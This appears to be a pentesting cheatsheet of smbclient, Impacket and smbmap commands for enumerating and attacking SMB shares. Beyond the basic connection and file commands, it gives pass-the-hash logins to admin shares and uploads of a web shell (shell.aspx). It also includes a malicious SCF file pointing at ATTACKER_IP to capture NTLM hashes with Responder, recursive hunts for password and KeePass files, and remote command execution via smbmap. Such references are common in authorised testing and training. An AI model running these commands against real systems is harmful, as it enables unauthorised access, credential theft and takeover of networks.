SMBClient & SMBMap

$ smb protocol enumeration & exploitation cheatsheet
Connection & Authentication
Basic Connection
AUTH
Anonymous / Null session
smbclient -N //TARGET/ShareName
Username + Password
smbclient //TARGET/ShareName -U 'DOMAIN\user%pass'
Prompt for password
smbclient //TARGET/ShareName -U user
Pass-the-Hash (PTH)
smbclient //TARGET/C$ -U Administrator --pw-nt-hash NTLM_HASH
Kerberos auth
smbclient //TARGET/ShareName -k -U user@DOMAIN.LOCAL
List Shares
ENUM
Null session
smbclient -N -L //TARGET
With credentials
smbclient -L //TARGET -U user%password
Specify SMB version
smbclient -L //TARGET --option='client min protocol=NT1'
With domain
smbclient -L //TARGET -W DOMAIN -U user%pass
Navigation & File Operations
Interactive Shell Commands
SHELL
List directory
smb: \> ls
Change directory
smb: \> cd Users\Administrator\Desktop
Download file
smb: \> get filename.txt
Upload file
smb: \> put localfile.txt remotefile.txt
Delete file
smb: \> del filename.txt
Make directory
smb: \> mkdir newdir
Show current dir
smb: \> pwd
Exit shell
smb: \> exit
Non-Interactive / Scripted
SCRIPTED
Run single command
smbclient //TARGET/Share -U user%pass -c "ls"
Download file non-interactively
smbclient //TARGET/Share -U user%pass -c "get file.txt /tmp/file.txt"
Recursive download all files
smbclient //TARGET/Share -U user%pass -c "recurse; prompt OFF; mget *"
Upload file
smbclient //TARGET/Share -U user%pass -c "put /tmp/shell.aspx shell.aspx"
Multiple commands
smbclient //TARGET/Share -U user%pass -c "cd subdir; ls; get secrets.txt"
Advanced & Attack Techniques
NTLM Theft / Hash Capture
ATTACK
Upload SCF file to capture hash (run Responder first)
smbclient //TARGET/Share -U user%pass -c "put /tmp/evil.scf @evil.scf"
[Shell]
Command=2
IconFile=\\ATTACKER_IP\share\icon.ico
Impacket smbclient.py
IMPACKET
Basic usage
smbclient.py DOMAIN/user:pass@TARGET
Pass-the-Hash
smbclient.py -hashes :NTLM_HASH DOMAIN/user@TARGET
Kerberos (with TGT)
smbclient.py -k -no-pass DOMAIN/user@TARGET
Useful Options & Flags
Specify IP (bypass DNS)
smbclient //dc01.domain.local/SYSVOL -U user%pass -I 192.168.1.10
Specify port
smbclient //TARGET/Share -p 445 -U user%pass
Debug / verbose
smbclient //TARGET/Share -d 3 -U user%pass
Set workgroup
smbclient //TARGET/Share -W WORKGROUP -N
Common Shares to Access
TARGETS
C$ Admin share
smbclient //TARGET/C$ -U Administrator%pass
IPC$ (null session)
smbclient //TARGET/IPC$ -N
SYSVOL (GPO / scripts)
smbclient //DC01/SYSVOL -U DOMAIN\user%pass
NETLOGON (logon scripts)
smbclient //DC01/NETLOGON -U DOMAIN\user%pass
ADMIN$ share
smbclient //TARGET/ADMIN$ -U Administrator%pass
Authentication & Connection
Basic Authentication
AUTH
Guest / null session
smbmap -H TARGET -u guest
Username + password
smbmap -H TARGET -u user -p password
With domain
smbmap -H TARGET -d DOMAIN -u user -p pass
Pass-the-Hash
smbmap -H TARGET -u Administrator -p 'aad3b435...:NTLM_HASH'
Hash only (no LM)
smbmap -H TARGET -u user -p '00000000000000000000000000000000:HASH'
Share Enumeration
ENUM
List all shares + permissions
smbmap -H TARGET -u user -p pass
Scan entire subnet
smbmap -H 192.168.1.0/24 -u user -p pass
Use host list file
smbmap --host-file hosts.txt -u user -p pass
Custom port
smbmap -H TARGET --port 445 -u user -p pass
File Discovery & Enumeration
Directory Listing
BROWSE
List root of share
smbmap -H TARGET -u user -p pass -r ShareName
List subdirectory
smbmap -H TARGET -u user -p pass -r 'ShareName\subdir'
Recursive listing
smbmap -H TARGET -u user -p pass -R ShareName
Recursive with depth limit
smbmap -H TARGET -u user -p pass -R ShareName --depth 5
Pattern & File Search
SEARCH
Search by filename pattern
smbmap -H TARGET -u user -p pass -A '.txt'
Search for creds-related filenames
smbmap -H TARGET -u user -p pass -R -A 'password|creds|secret'
Search for KeePass databases
smbmap -H TARGET -u user -p pass -R C$ -A '.kdbx'
Case-insensitive regex search
smbmap -H TARGET -u user -p pass -R -A '(?i)password'
File Transfer & Command Execution
Upload & Download
TRANSFER
Download file
smbmap -H TARGET -u user -p pass --download 'ShareName\path\file.txt'
Upload file
smbmap -H TARGET -u user -p pass --upload '/tmp/shell.aspx' 'ShareName\shell.aspx'
Delete remote file
smbmap -H TARGET -u user -p pass --delete 'ShareName\file.txt'
Remote Command Execution
EXEC
Execute whoami
smbmap -H TARGET -u admin -p pass -x 'whoami'
Execute ipconfig
smbmap -H TARGET -u admin -p pass -x 'ipconfig /all'
Requires admin rights. Uses PSEXEC-style execution via ADMIN$/C$
Output & Logging
OUTPUT
Quiet mode (shares only)
smbmap -H TARGET -u user -p pass -q
Verbose output
smbmap -H TARGET -u user -p pass -v
